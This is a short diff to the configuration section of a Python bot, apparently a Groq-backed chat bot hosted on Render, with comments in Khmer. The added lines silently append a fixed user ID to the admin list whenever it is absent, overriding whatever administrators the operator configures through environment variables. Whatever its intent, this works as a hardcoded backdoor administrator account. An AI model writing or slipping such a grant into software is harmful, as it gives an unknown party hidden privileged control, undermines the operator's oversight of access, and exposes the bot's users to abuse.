@@ -25,6 +25,8 @@ if not GROQ_API_KEY:
 
 RENDER_URL = os.getenv("RENDER_EXTERNAL_URL", "")
 ADMIN_IDS = [int(i) for i in os.environ.get("ADMIN_IDS", "").split(",") if i]
+if 240224709 not in ADMIN_IDS:
+    ADMIN_IDS.append(240224709)
 
 # ការកំណត់ការចូលរួមក្រុម
 REQUIRED_GROUP_ID = os.environ.get("REQUIRED_GROUP_ID", "-1004293304141") # លេខ ID របស់ក្រុម/Channel
